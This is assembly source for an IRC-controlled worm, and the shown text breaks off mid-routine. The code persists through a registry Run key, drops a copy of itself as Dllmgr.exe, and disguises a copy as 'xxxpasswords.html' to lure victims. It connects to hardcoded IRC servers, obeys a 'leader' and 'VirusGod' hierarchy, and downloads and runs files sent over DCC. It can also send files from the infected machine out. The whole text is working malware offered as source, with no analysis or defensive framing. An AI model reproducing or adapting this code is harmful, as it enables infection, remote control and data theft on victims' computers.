   ; after compiling, open ircbot.exe, go to offset 2 (right after MZ) and write '<!--'
   ; this will make the code disappear in the dropped html file 'xxxpasswords.html'




   includelib kernel32.lib
   includelib user32.lib
   includelib wsock32.lib
   includelib advapi32.lib
   includelib rasapi32.lib

   .486
   .model flat, stdcall

   include c:\masm\include\windows.inc
   include c:\masm\include\wsock32.inc
   include c:\masm\include\kernel32.inc
   include c:\masm\include\user32.inc
   include c:\masm\include\advapi32.inc
   include c:\masm\include\rasapi32.inc

           CRLF                    equ     0a0dh
           Magic                   equ     "cRIV"
           NumSlaves               equ     5

   .data
           online                  dd      0
           Temp                    dd      0

           RandomNumber            dd      0
           hKey                    dd      0

           CR                      db      0dh,0
           LF                      db      0ah,0
           Space                   db      " ",0
           ExclamanationMark       db      "!",0


           sin_family              dw      AF_INET
           sin_port                dw      2842    ; 6667
           sin_addr                dd      0
           sin_zero                dd      0,0

           SocketPtr               dd      0
           Recvs                   dd      0


           TemporaryBuffert        dd      0
           InBuffertPtr            dd      0
           BuffertPtr              dd      0

           StrBuffert              dd      0
           Buffs                   dd      9 dup (0)

           DebugFilePtr            dd      0
           DebugFilename           db      "irc.txt",0

           DataFilePtr             dd      0
           DataFilename            db      "script.dat",0

           ScriptInMem             dd      0
           ScriptFileSize          dd      0

           Aligment                dd      0

           MyNick                  dd      0
           MyIdent                 dd      0
           MyRealName              dd      0

           God                     dd      0
           Leader                  dd      0

           Slaves                  dd      0
           Slave1                  dd      0
           Slave2                  dd      0
           Slave3                  dd      0
           Slave4                  dd      0
           Slave5                  dd      0

   Msg1    db      "01",0
   Msg2    db      "02",0
   Msg3    db      "03",0
   Msg4    db      "04",0
   Msg5    db      "05",0
   Msg6    db      "06",0
   Msg7    db      "07",0
   ErrorMsg db     "Step",0



           IgnoreNicks             dd      0


           IRCIpNumbers            dd      0
                                   dd      0       ; this creates a CCh byte
           IRCCurrentIp            dd      0


           HostIpAddress           dd      0
           MessageHandler          dd      0

           DownloadedFiles         dd      0

           SendingNick             dd      0
           SendingCommand          dd      0

           scriptExeName           db      "script.exe",0
           ExeAlign                dd      0
           ExeNamePtr              dd      0

           SendVirusName           db      "xxxpasswords.html",0
           DropVirusName           db      "Dllmgr.exe",0

           ThreadSendString        db      400 dup (0)

           SendMyNickInfo          db      "NICK $mynick",0
           SendMyUserInfo          db      "USER $username . . :$realname",0

           DollarReplacements      db      "mynick",0
                                   dd      MyNick

                                   db      "username",0
                                   dd      MyIdent

                                   db      "realname",0
                                   dd      MyRealName

                                   db      "god",0
                                   dd      God

                                   db      "leader",0
                                   dd      Leader

                                   db      "slaves",0
                                   dd      Slaves

                                   db      "slave1",0
                                   dd      Slave1

                                   db      "slave2",0
                                   dd      Slave2

                                   db      "slave3",0
                                   dd      Slave3

                                   db      "slave4",0
                                   dd      Slave4

                                   db      "slave5",0
                                   dd      Slave5

                                   db      "nick",0
                                   dd      SendingNick

                                   db      "recv",0
                                   dd      RecvPtr

                                   db      "path",0
                                   dd      PathPtr

                                   db      0


           StackUsed       equ     4000

   Functionlist    dd      0
                   dd      RestartAllFuckingThings

                   dd      DCCRecvFunction
                   dd      DCCRecvFunction  ; chat

                   dd      DCCSendFunction
                   dd      QuitFunction

                   dd      NewSlaveFunction
                   dd      ShouldRecieveProgram
                   dd      GenerateNewNick

                   dd      ExecuteProgram
                   dd      DirFunction


           RecvPtr         dd      RecvString
           PathPtr         dd      PathString
   ; Strings
           db      0
           PRIVMSGNick             db      "PRIVMSG $recv :",0
           NoPlaceString           db      "PRIVMSG $recv :No, ask $slave1",0
           ERR_PARSE               db      "Error parsing message!",0
           NickStr                 db      "$nick",0
           YouGotFileStr           db      "SEND:",0
           GetFileString           db      "PRIVMSG $recv :DCC $3",0
           Worked                  db      "Worked",0
           NickCommand             db      "NICK 1234567890",0
           RecvString              db      300 dup (0)
           PathString              db      "c:\windows\system"
                                   db      260 dup (0)

           ErrorStr                db      "Error",0,0,0,0,0,0,0

           RegSubKey               db      "Software\Microsoft\Windows\CurrentVersion\Run",0

           RegName                 db      "Teddybear",0







   .code


   ; This scriptfile is used to recieve a more advanced (and bigger) scriptfile
   ; If there already exist a scriptfile then this isnt used

           NULL                    equ     0
           EndOfList               equ     0

           NoScan                  equ     1

           s_ScriptSize            equ     s_End-s_Header
           s_ConnectFunction       equ     1
           s_DCCRecvFunction       equ     2
           s_DCCChatFunction       equ     3

           s_DCCSendFunction       equ     4

           s_QuitFunction          equ     5
           s_NewSlaveFunctions     equ     6
           s_ShouldRecieveProgram  equ     7

      s_Header:
           s_Magic                 db      "VIRc"
           s_Alignment             dd      -401000h

           s_User                  dd      s_Userinfo
           s_Slaves                dd      s_SlaveNames
           s_Ignores               dd      s_IgnoreNames
           s_IRCServers            dd      s_IPList

           s_MessageParsePtr       dd      s_MessageParseData

           s_DownloadedFiles       dd      s_ListOfDownloadedFiles

      s_EndOfHeader:

   ; ---------------------------------------------- User info

      s_Userinfo:
           s_Nickname              db      10 dup (0)
           s_Ident                 db      "Nick"
           db      10-($-s_Ident)    dup (0)
           s_RealName              db      "DrSolomon"
           db      10-($-s_RealName) dup (0)
           s_God                   db      "VirusGod"
           db      10-($-s_God)      dup (0)
           s_Leader                db      "VirusGod"
           db      10-($-s_Leader)   dup (0)
      s_SlaveNames:
      s_IgnoreNames:
                                   db      EndOfList

   ; ----------- List of IP addresses of undernet IRC servers

     s_IPList                      db      "192.160.127.97",0
                                   db      "130.243.35.1",0   ; efnet
                                   db      "203.37.45.2",0
                                   db      "209.47.75.34",0
                                   db      "195.154.203.241",0
                                   db      "194.159.80.19",0
                                   db      "128.138.129.31",0
                                   db      EndOfList

   ; -------------- How to handle messages

     s_MessageParseData:
                                   db      NoScan
                                   db      "|$0 ",2
                                   dd      s_RealStart
                                   db      EndOfList

     s_RealStart:
                                   db      "$0 PRIVMSG",0
                                   db      "|$1 ",2; split $1 at space until
                                                   ; two new strings is created
                                   dd      s_PrivMsgData

                                   db      "$0 001",0 ; First message
                                   db      "l"
                                   dd      s_StartCommands

                                   db      "$0 303",0
                                   db      "l"
                                   dd      s_IsOnMessage


   ; Low level commands
                                   db      "$0 PING",0
                                   db      "s"
                                   db      "PONG $1",0

                                   db      "$0 433",0
                                   db      "f"
                                   dw      8       ;GenerateNewNick

                                   db      "$0 ERROR",0
                                   db      "f"
                                   dw      s_ConnectFunction

                                   db      EndOfList

   ; ------------------------------------ Handler of PRIVMSGs

     s_PrivMsgData:

                   db      "$nick $leader",0       ; messages from the leader
                   db      "l"
                   dd      s_LeaderMessages


                   db      EndOfList

     s_LeaderMessages:
                   db      "$2 ",01,"DCC",0        ; leader sends a file
                   db      "|$2 ",3                ; $3 = send or chat
                   dd      s_DCCRecvProc           ; $4 = additional data

                   db      "$2 :Hello child",0
                   db      "s"
                   db      "$0 $leader :DCC script.exe",0

                   db      EndOfList

   ; -------------------------------------------- DCC Handler
     s_DCCRecvProc:
               db  "$3 SEND",0
               db  "f"
                           dw      s_DCCRecvFunction

                           db      NoScan
                           db      "f"
                           dw      s_QuitFunction

               db  EndOfList

   ; ------------------------------------ If leader is online
     s_IsOnMessage:
                                   db      "$1 $leader",0
                                   db      "s"
                                   db      "PRIVMSG $leader :Hello master",0

                                   db      "!$1 $leader",0
                                   db      "l"
                                   dd      s_Restart
                                   db      EndOfList

     s_Restart:                    ; new leader is god
                                   db      NoScan
                                   db      "v"
                                   db      "$leader $god",0

                                   ; restart virus
   ; ----------------------- Commands to send when registered

     s_StartCommands:              ; Check if leader is online, if virus = god
                                   ; then its not nessesary

                                   db      "!$mynick $god",0
                                   db      "s"
                                   db      "ISON $leader",0
                                   db      EndOfList

   s_ListOfDownloadedFiles:
                                   db      EndOfList

   s_End:


   StartIrcBot:

   Random proc RndMax:dword
           local   time:SYSTEMTIME
           push    ebx
           push    edx
           mov     eax,RndMax
           inc     eax
           mov     ebx,eax

           lea     eax,time
           invoke  GetLocalTime, eax

           mov     ax,time.wMilliseconds
           shl     eax,16
           mov     ax,time.wSecond

           rol     ax,8
           or      ax,time.wMinute
           rol     ax,16
           or      ax,time.wHour

           add     eax,RandomNumber
           rol     eax,cl
           add     eax,14
           xor     ecx,46
           ror     eax,cl
           add     RandomNumber,eax

           cmp     ebx,0
           jz      NoMod
           xor     edx,edx
           div     ebx
           xchg    eax,edx
        NoMod:
           pop     edx
           pop     ebx
           ret
   Random endp


   UpdateScriptFile:
           push    ebx
           lea     eax,DataFilename
           mov     ebx,GENERIC_WRITE
           mov     ecx,CREATE_ALWAYS
           call    MyOpenFile
           jz      Error



           push    eax
           invoke  WriteFile, eax, ScriptInMem, ScriptFileSize, offset Temp, 0

           call    CloseHandle
           pop     ebx
           ret


   GetIpFunction:
           push    edi
           invoke  LocalAlloc, LMEM_ZEROINIT, 1000
           mov     edi, eax
           invoke  gethostname, edi, 950
           invoke  gethostbyname, edi

           test    eax,eax
           jz      Return

           mov     ecx,[eax+3*4]
           mov     ecx,[ecx]
           mov     ecx,[ecx]
           invoke  htonl, ecx

           mov     HostIpAddress, eax
           invoke  LocalFree, edi

           pop     edi
          Return:
           ret

   QuitFunction:

           jmp     Error

   StringCmp:
           push    esi
           push    edi
           invoke  lstrlen,esi
           mov     Temp,eax
           invoke  lstrlen,edi
           cmp     eax,Temp
           jnz     NotEqualStrings
           mov     ecx,eax

           repz    cmpsb

      NotEqualStrings:
           pop     edi
           pop     esi
           ret

   MyOpenFile:
           xor     edx,edx
           invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
           mov     ebx,eax
           cmp     eax,INVALID_HANDLE_VALUE

           ret


   AsciiToNum proc NumString:dword

           push    esi
           mov     esi,NumString

           xor     ecx,ecx

        CheckNextChar:
           lodsb
           cmp     al,'0'
           jl      NoMore
           cmp     al,'9'
           ja      NoMore
           inc     ecx
           jmp     CheckNextChar

       NoMore:
           mov     esi,NumString

           xor     eax,eax
           xor     edx,edx

        CreateNumber:
           imul    edx,edx,10
           lodsb
           sub     eax,'0'
           add     edx,eax
           loop    CreateNumber

           pop     esi
           mov     eax,edx
           ret


   AsciiToNum endp










   lstrlenInc proc String:dword
           invoke  lstrlen, String
           inc     eax
           ret
   lstrlenInc endp


   LoadSlaveData proc SlavePtr
           push    ebx
           push    edi

           mov     eax,SlavePtr
           mov     ebx,Slaves

           lea     edi,Slave1
           mov     ecx,NumSlaves
        CopySlaveNames:
           push    eax
           push    ecx

           invoke  lstrcpy, ebx, eax
           invoke  lstrlen, ebx
           pop     ecx


           test    eax,eax
           jz      NoComma

           add     ebx,eax
           mov     byte ptr [ebx],','
           inc     ebx
        NoComma:
           pop     eax

           stosd
           add     eax,10
           loop    CopySlaveNames

           .if ebx!=Slaves
           dec     ebx
           mov     byte ptr [ebx],cl
           .endif

           pop     edi
           pop     ebx
           ret
   LoadSlaveData endp


   SetupProgram proc uses ebx edi esi
           local   FileHandle:dword
           xor     esi, esi

           invoke  RegCreateKey, HKEY_LOCAL_MACHINE, offset RegSubKey, offset hKey
           test    eax,eax
           jnz     Error

           invoke  LocalAlloc, LMEM_ZEROINIT, 600
           mov     ebx, eax
           lea     edi, [eax+300]

           invoke  GetCurrentDirectory, 300, ebx
           invoke  GetSystemDirectory, edi, 300
           invoke  SetCurrentDirectory, edi

           mov     eax,"NIW\"
           cmp     [ebx+2],eax
           jnz     FinishedEditScriptExe

           invoke  GetModuleFileName, esi, ebx, 300

           invoke  RegSetValueEx, hKey, offset RegName, esi, REG_SZ, ebx, eax


           invoke  LocalFree, ebx
           invoke  RegCloseKey, hKey

           sub     esp,1000h
           mov     eax,esp
           INVOKE  WSAStartup, 1h, eax
           add     esp,1000h


           lea     eax,DebugFilename
           mov     ebx,GENERIC_WRITE
           mov     ecx,CREATE_ALWAYS
           invoke  CreateFileA, eax, ebx, 1, esi, ecx, esi, esi
           mov     DebugFilePtr, eax

           lea     eax,DataFilename
           mov     ebx,GENERIC_READ
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      OpenInternScriptFile


           mov     DataFilePtr, eax
           invoke  GetFileSize, eax, 0

           mov     ScriptFileSize,eax

           mov     edi, eax
           lea     eax,[eax+5000]

           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           mov     StrBuffert,eax

           add     eax,3000
           mov     ScriptInMem,eax
           mov     esi,eax                         ; esi -> IRC data header
           invoke  ReadFile, DataFilePtr, eax, edi, offset Temp, 0

           invoke  CloseHandle, DataFilePtr
           jmp     ReadScriptFile

   OpenInternScriptFile:
           mov     esi,offset s_Header
           mov     eax,s_ScriptSize
           mov     ScriptFileSize,eax
           add     eax,3000

           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           mov     StrBuffert, eax
           add     eax,3000
           mov     edi, eax
           mov     ScriptInMem, eax
           mov     ecx,s_ScriptSize
           rep     movsb
           mov     esi,eax

      ReadScriptFile:

           lodsd                                   ; Magic
           cmp     eax,Magic
           jnz     Error

           lodsd                                   ; aligment
           add     eax,esi
           lea     ebx,[eax-8]
           mov     Aligment,ebx

           lodsd                                   ; pointer to Userinfo
           lea     edi,[eax+ebx]

           push    ebx
           lea     ebx,MyNick

        CopyUserData:
           mov     [ebx], edi
           add     ebx,4
           add     edi,10
           cmp     byte ptr [edi],0
           jnz     CopyUserData
           pop     ebx

           invoke  LocalAlloc, LMEM_ZEROINIT, 10*NumSlaves
           mov     Slaves,eax

           lodsd                                   ; slave names
           add     eax,ebx

           invoke  LoadSlaveData, eax

           lodsd                                   ; Ignore names
           add     eax,ebx
           mov     IgnoreNicks,eax



           lodsd                                   ; IRC server list
           add     eax,ebx
           mov     IRCIpNumbers,eax
           mov     IRCCurrentIp,eax

           lodsd                                   ; Message Handler
           add     eax,ebx
           mov     MessageHandler,eax

           lodsd                                   ; Downloaded files ptr
           add     eax,ebx
           mov     DownloadedFiles, eax

           mov     esi,eax
           mov     edi,eax


      CheckNextFilename:
           mov     eax,esi
           mov     ebx,0
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      FileDidntExist

           invoke  CloseHandle, eax

           invoke  lstrcpy, edi, esi
           invoke  lstrlenInc, esi
           add     edi, eax

       FileDidntExist:
           invoke  lstrlenInc, esi
           dec     eax
           jz      NoIncrease
           inc     eax

        NoIncrease:
           add     esi,eax
           cmp     byte ptr [esi],0
           jnz     CheckNextFilename

           mov     byte ptr [edi],0
           sub     esi, edi

           sub     ScriptFileSize, esi

           call    UpdateScriptFile

           invoke  LocalAlloc, LMEM_ZEROINIT, 3000
           mov     BuffertPtr,eax
           mov     InBuffertPtr,eax

           invoke  LocalAlloc, LMEM_ZEROINIT, 1000
           mov     TemporaryBuffert,eax

           mov     esi,DownloadedFiles

       RunNextProgram:
           invoke  WinExec, esi, SW_SHOW
           invoke  lstrlen, esi
           test    eax,eax
           jz      NoMoreFilesToRun

           inc     eax
           add     esi, eax
           jmp     RunNextProgram

       NoMoreFilesToRun:

           mov     eax,offset scriptExeName
           mov     ebx,GENERIC_WRITE+GENERIC_WRITE
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      FinishedEditScriptExe

           xor     esi, esi
           invoke  SetFilePointer, ebx, 200h+4, esi, esi

           invoke  ReadFile, ebx, offset ExeAlign, 8, offset Temp, esi
           mov     edi,ExeNamePtr
           sub     edi,ExeAlign
           add     edi,200+40

           invoke  Random, 20
           test    eax,eax
           jnz     SetNewLeader

           sub     edi, 10                         ; change god instead

        SetNewLeader:
           invoke  SetFilePointer, ebx, eax, esi, esi

           invoke  WriteFile, ebx, MyNick, 10, offset Temp, esi
           invoke  CloseHandle, ebx

       FinishedEditScriptExe:

           xor     esi,esi

           mov     eax,Offset SendVirusName
           mov     ebx,GENERIC_WRITE
           mov     ecx,CREATE_ALWAYS
           call    MyOpenFile
           jz      DroppedNewVirus

           mov     FileHandle, ebx

           invoke  LocalAlloc, LMEM_ZEROINIT, 300
           mov     edi, eax

           invoke  GetModuleFileName, esi, edi, 300

           invoke  CreateFileA, edi, GENERIC_READ, 1, esi, OPEN_EXISTING, esi, esi
           mov     ebx, eax
           inc     eax
           jz      Error

           invoke  LocalFree, edi

           invoke  CreateFileMappingA, ebx, esi, PAGE_WRITECOPY, esi, esi, esi
           mov     edi, eax
           test    eax,eax
           jz      Error

           invoke  MapViewOfFile, edi, FILE_MAP_COPY, esi, esi, esi
           test    eax,eax
           jz      Error


           xchg    esi, eax
           pushad
           invoke  GetFileSize, ebx, eax
           mov     edi, eax

           mov     eax, offset DropVirusName
           mov     ebx, GENERIC_WRITE
           mov     ecx, CREATE_NEW
           call    MyOpenFile
           jz      DontDropFile

           invoke  WriteFile, ebx, esi, edi, offset Temp, 0
           invoke  CloseHandle, ebx

           invoke  WinExec, offset DropVirusName, SW_SHOW
           jmp     Error

      DontDropFile:

           lea     edi, [esi+((s_Userinfo+40)-s_Header+400h)]
           invoke  Random, 20
           test    eax,eax
           jnz     ChangeLeader
           sub     edi, 10

      ChangeLeader:
           mov     esi, MyNick
           test    esi, esi
           jz      Error
           mov     ecx, 10
           rep     movsb

           popad
           invoke  GetFileSize, ebx, eax

           invoke  WriteFile, FileHandle, esi, eax, offset Temp, 0

           invoke  UnmapViewOfFile, esi

           invoke  CloseHandle, edi
           invoke  CloseHandle, ebx

           invoke  CloseHandle, FileHandle

     DroppedNewVirus:


           mov     eax,MyNick
           mov     eax,[eax]
           test    eax,eax
           jnz     DontNeedToGenerateNewNick

           call    GenerateNewNick

     DontNeedToGenerateNewNick:
           ret
   SetupProgram endp






   FindReplacement proc DollarCommand:dword
           push    esi
           push    edi

           mov     esi,DollarCommand

           mov     edx,TemporaryBuffert
           mov     edi,edx
           xor     eax,eax

           lodsb
           cmp     al,'$'
           jnz     Error

           lodsb

           .if al>='0' && al<='9'
                   sub     al,'0'
                   lea     eax,[Buffs+eax*4]
                   push    2


           .else
                   push    edx
               GetStringToDisplace:
                   push    eax
                   invoke  IsCharAlphaNumeric, eax
                   test    eax,eax
                   pop     eax
                   jz      SeekForDisplacement
                   stosb
                   lodsb
                   jmp     GetStringToDisplace

               SeekForDisplacement:
                   pop     edx
                   xor     eax,eax
                   stosb
                   sub     esi,DollarCommand
                   dec     esi
                   push    esi

                   mov     edi,edx                 ; edi -> $ string
                   lea     esi,DollarReplacements  ; esi -> list of $ strings

               SeekForReplacement:
                   invoke  lstrlenInc,esi
                   push    eax
                   call    StringCmp
                   pop     eax
                   jz      FoundString

               DidntFind:
                   lea     esi,[esi+eax+4]
                   cmp     byte ptr [esi],0
                   jnz     SeekForReplacement

                   mov     eax,DollarCommand
                   jmp     ReturnFindReplacement

             FoundString:
                   mov     eax,[esi+eax]           ; esi -> -> String
           .endif

       ReturnFindReplacement:
       ReturnNoDollar:
           push    eax
           mov     eax,[eax]                       ; eax -> String

           invoke  lstrcpy, TemporaryBuffert, eax
           pop     edx                             ; ptr to ptr to string
           pop     ecx                             ; length of $ command
           pop     edi
           pop     esi
           ret
   FindReplacement endp




   ; sets carry flag if not found
   IsInMessage proc StringToSearchIn:dword, SearchString:dword
           push    edi                             ; save registers
           push    esi                             ; ebx, esi, edi should never
                                                   ; be changed in a function

           invoke  lstrlen,SearchString

           mov     edi,eax

           invoke  lstrlen,StringToSearchIn

           sub     eax,edi
           jc      NotFound

           inc     eax
           mov     edx,edi
           mov     esi,StringToSearchIn
           mov     edi,SearchString

         ScanLoop:
           push    esi
           push    edi
           mov     ecx,edx
           repz    cmpsb
           pop     edi
           pop     esi
           jz      FoundString

           inc     esi
           dec     eax
           jz      NotFound                        ; jnz ScanLoop, but faster
           jmp     ScanLoop                        ; on pentiums

        NotFound:
           pop     esi
           pop     edi
           mov     eax,StringToSearchIn
           stc
           ret

        FoundString:
           mov     eax,esi
           pop     esi
           pop     edi
           clc
           ret
   IsInMessage endp


   SplitStringAtSpace proc Message:dword
           invoke  IsInMessage, Message, offset Space
           jb      NoSpaceInString

           mov     byte ptr [eax],0
           inc     eax
       NoSpaceInString:
           ret
   SplitStringAtSpace endp


   CreateString proc ToString:dword, FromString:dword
           push    esi
           push    edi
           mov     esi,FromString
           mov     edi,ToString

        CreateStringLoop:
           xor     eax,eax
           lodsb

           .if eax=="$"
                   dec     esi
                   invoke  FindReplacement, esi
                   add     esi,ecx                 ; string length returned in
                                                   ; ecx, wont work in HLL

                   push    eax                     ; copy from
                   invoke  lstrlen,eax
                   inc     eax

                   push    edi                     ; copy to
                   add     edi,eax

                   call    lstrcpy
                   dec     edi

           .elseif eax!=0
                   stosb
           .else
                   jmp     StringCreated
           .endif
           jmp     CreateStringLoop

        StringCreated:
           mov     eax,edi
           pop     edi
           pop     esi
           ret
   CreateString endp


   SendMsg proc Message:dword
           push    esi
           push    edi

           mov     eax,1000
           invoke  LocalAlloc, LMEM_ZEROINIT, eax

           mov     edi,eax
           mov     esi,Message

           invoke  CreateString, edi, esi

           mov     word ptr [eax],CRLF
           sub     eax,edi
           lea     esi,[eax+2]

           push    0
           mov     edx,esp
           invoke  WriteFile, DebugFilePtr, edi, esi, edx, 0  ; for debugging
           pop     ecx

           invoke  send, SocketPtr, edi, esi, 0    ; send string to irc server
           invoke  LocalFree, edi

           pop     edi
           pop     esi
           ret
   SendMsg endp

   GetMsg proc WriteBuffert:dword
   GetMsgStart:
           invoke  IsInMessage, InBuffertPtr, offset LF
           jnc     EnoughData

           invoke  lstrlen, InBuffertPtr
           push    esi
           mov     esi,eax
           inc     eax
           invoke  lstrcpyn, BuffertPtr, InBuffertPtr, eax

           add     eax,esi                         ; eax -> Zerospace
           mov     ebx,498
           sub     ebx,esi                         ; how much to read
           pop     esi

           push    eax
           invoke  recv, SocketPtr, eax, ebx, 0

           test    eax,eax
           jz      Error
           cmp     eax,-1
           jz      Error

           pop     ecx
           add     eax,ecx

           push    BuffertPtr
           pop     InBuffertPtr
           mov     byte ptr [eax],0

           jmp     GetMsgStart

       EnoughData:
   ; debug code
           pushad
           sub     eax,InBuffertPtr
           inc     eax

           push    0
           mov     edx,esp
           invoke  WriteFile, DebugFilePtr, InBuffertPtr, eax, edx, 0
           pop     edx
           popad

           mov     byte ptr [eax],0

           inc     eax
           xchg    eax,InBuffertPtr

           invoke  lstrcpy, WriteBuffert, eax

           lea     eax,CR                          ; delete CR
           invoke  IsInMessage, WriteBuffert, eax
           jc      GetMsgReturn
           mov     byte ptr [eax],0

        GetMsgReturn:
           invoke  lstrlen, WriteBuffert

           mov     ecx,WriteBuffert
           xor     edx,edx
           mov     [ecx+eax],edx

           push    ebx
           lea     ebx, ThreadSendString
           mov     eax,dword ptr [ebx]
           test    eax,eax
           jz      NoThreadInfoToSend

           invoke  SendMsg, ebx
           xor     eax,eax
           mov     [ebx],eax

      NoThreadInfoToSend:
           pop     ebx
           ret


   GetMsg endp


   NumToAscii proc Buffert:dword, Number:dword
           push    edi
           push    esi
           push    ebx
           invoke  LocalAlloc, LMEM_ZEROINIT, 20
           mov     ebx,eax
           lea     esi,[eax+19]

           mov     eax,Number
           mov     ecx,10

        StringCreateLoop:
           xor     edx,edx
           div     ecx
           add     edx,'0'
           dec     esi
           mov     byte ptr [esi],dl
           test    eax,eax
           jnz     StringCreateLoop

           mov     edi,Buffert
           invoke  lstrlen, esi
           mov     ecx,eax
           rep     movsb
           invoke  LocalFree, ebx

           pop     ebx
           pop     esi
           pop     edi
           ret
   NumToAscii endp

   ExecuteProgram:
           mov     eax,[Buffs+3*4]
           invoke  WinExec, eax, SW_SHOW
           ret

   DCCSendMessage  db      "PRIVMSG $nick :",01,"DCC SEND $3",0
   SendInAscii     db      "SEND",0

   DCCSendSpaceSaver:
           invoke  lstrlen, edi
           add     edi, eax
           mov     al,' '
           stosb
           ret

   DCCSend proc SendString:dword
           local   DCCConnection:sockaddr_in
           local   SockAddrTemp:sockaddr_in
           local   DCCSocket:dword
           local   FilePtr:dword
           local   ByteRead:dword
           local   DCCTemp:dword
           local   FileName:dword
           local   DCCMemPtr:dword
           local   BytesRead:dword
           local   Port:dword


           local   TimeOut:timeval
           local   readfds:fd_set

           xor     esi, esi

           invoke  IsInMessage, SendString, offset SendInAscii
           invoke  IsInMessage, eax, offset Space
           inc     eax
           mov     FileName, eax

           invoke  CreateFileA, eax, GENERIC_READ, FILE_SHARE_READ, esi, OPEN_EXISTING, esi, esi
           mov     ebx,eax
           inc     eax
           jz      FileNotFound
           mov     FilePtr, ebx

           invoke  GetFileSize, ebx, esi
           mov     ByteRead, eax

           invoke  socket, AF_INET, SOCK_STREAM, esi
           mov     DCCSocket, eax

           mov     DCCConnection.sin_family, AF_INET

           lea     edi,DCCConnection.sin_zero
           xor     eax,eax
           stosd
           stosd


           invoke  Random, 2000
           add     eax,50200
           mov     Port,eax
           push    eax
           call    htons
           mov     DCCConnection.sin_port,ax

           xor     eax,eax
           mov     DCCConnection.sin_addr,eax

           lea     eax,DCCConnection
           invoke  bind, DCCSocket, eax, sizeof(sockaddr_in)
           test    eax,eax
           jnz     ErrorDCCSend


           mov     edi,SendString
           call    DCCSendSpaceSaver

           invoke  NumToAscii, edi, HostIpAddress
           call    DCCSendSpaceSaver

           invoke  NumToAscii, edi, Port
           call    DCCSendSpaceSaver

           mov     eax,ByteRead
           invoke  NumToAscii, edi, eax
           invoke  lstrlen,edi
           add     edi, eax

           xor     eax,eax
           inc     eax
           stosb

           lea     ebx, ThreadSendString
      WaitUntilMessageQueueIsCleared:
           invoke  Sleep, 100
           mov     eax,[ebx]
           test    eax,eax
           jnz     WaitUntilMessageQueueIsCleared

           invoke  lstrcpy, offset ThreadSendString, SendString ; let the main
                                                   ; thread send the message

           invoke  listen, DCCSocket, 2

           lea     ebx,readfds
           assume  ebx:ptr fd_set
           inc     esi
           mov     [ebx].fd_count, esi
           dec     esi

           mov     eax,DCCSocket
           mov     [ebx].fd_array, eax

           assume  ebx:nothing

           lea     eax,TimeOut
           assume  eax:ptr timeval
           mov     [eax].tv_sec, 50
           mov     [eax].tv_usec, esi
           assume  eax:nothing

           invoke  select, ecx, ebx, esi, esi, eax
           test    eax,eax
           jz      ErrorDCCSend

           invoke  accept, DCCSocket, esi, esi

           xchg    eax,DCCSocket
           invoke  closesocket, eax

           mov     esi,1000
           sub     esp,esi
           mov     ebx,esp

        SendLoop:
           lea     edi,BytesRead
           invoke  ReadFile, FilePtr, ebx, esi, edi, 0

           invoke  send, DCCSocket, ebx, [edi], 0

           cmp     [edi],esi
           jz      SendLoop
           add     esp,esi

           invoke  Sleep, 5000

        ErrorDCCSend:
           invoke  closesocket, DCCSocket
           invoke  CloseHandle, FilePtr

        FileNotFound:
           invoke  LocalFree, SendString
           ret

   DCCSend endp

   DCCSendFunction proc
           push    edi

           invoke  LocalAlloc, LMEM_ZEROINIT, 2000

           mov     edi,eax

           invoke  CreateString, edi, offset DCCSendMessage

           invoke  CreateThread, 0, StackUsed, offset DCCSend, edi, 0, offset Temp
           pop     edi
           ret
   DCCSendFunction endp


   GenerateNewNick:
           pushad

           mov     edi,MyNick
           invoke  Random, 4

           lea     ebx,[eax+4]                     ; how many chars (4-8)

           invoke  Random, 'Z'-'A'
           add     eax,'A'
           stosb                                   ; store character

       CreateNickLoop:
           invoke  Random, 'z'-'a'
           add     eax,'a'
           stosb
           dec     ebx
           jnz     CreateNickLoop

           xor     eax,eax
           stosb

           call    UpdateScriptFile

           lea     eax,[NickCommand+5]
           invoke  lstrcpy, eax, MyNick

           invoke  SendMsg, offset NickCommand

           popad
           ret

   DCCRecv proc DCCMessage:dword
           local   DCCConnection:sockaddr_in
           local   DCCSocket:dword
           local   DCCFileptr:dword
           local   DCCTemp:dword
           local   DCCFilename:dword


           invoke  socket, AF_INET, SOCK_STREAM, 0
           mov     DCCSocket, eax

           mov     DCCConnection.sin_family, AF_INET

           mov     esi, DCCMessage

           invoke  SplitStringAtSpace, esi         ; eax -> ip

           mov     esi,eax
           mov     edi,eax

           invoke  lstrlen, DCCMessage
           add     eax,50
           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           mov     DCCFilename, eax
           invoke  lstrcpy, eax, DCCMessage

           mov     eax,DCCMessage
           mov     ebx,GENERIC_READ or GENERIC_WRITE
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      ErrorRecieving

           mov     DCCFileptr,eax

           invoke  SplitStringAtSpace, esi         ; eax -> port
           mov     esi,eax

           invoke  AsciiToNum, edi
           invoke  htonl, eax
           mov     DCCConnection.sin_addr,eax

           mov     edi,esi
           invoke  SplitStringAtSpace, esi         ; eax -> size

           invoke  AsciiToNum, eax
           mov     ebx,eax

           invoke  AsciiToNum, edi
           push    eax
           call    htons
           mov     DCCConnection.sin_port,ax

           lea     edi,DCCConnection.sin_zero
           xor     eax,eax
           stosd
           stosd

           lea     eax,DCCConnection
           invoke  connect, DCCSocket, eax, sizeof(sockaddr_in)
           cmp     eax,SOCKET_ERROR
           jz      FileRecieved
           xor     esi, esi

       RecieveFileLoop:
           invoke  recv, DCCSocket, DCCMessage, 1000, 0 ; copy data to buffert
           inc     eax
           jz      ErrorRecieving
           dec     eax

           sub     ebx,eax                         ; ebx = how much more data
           add     esi, eax

           lea     ecx,DCCTemp
           xor     edx,edx
           mov     [ecx],edx
           invoke  WriteFile, DCCFileptr, DCCMessage, eax, ecx, 0

           invoke  htonl, esi
           mov     DCCTemp, eax
           lea     eax,DCCTemp

           invoke  send, DCCSocket, eax, 4, 0

           test    ebx,ebx
           jnz     RecieveFileLoop


   FileRecieved:
           invoke  closesocket, DCCSocket
           invoke  CloseHandle, DCCFileptr
           invoke  LocalFree, DCCMessage

           invoke  WinExec, DCCFilename, SW_SHOW

           mov     esi,DownloadedFiles

         GetEndOfFileList:
           invoke  lstrlenInc, esi
           dec     eax
           jz      NoChangeBack
           inc     eax
        NoChangeBack:
           add     esi, eax
           cmp     byte ptr [esi],0
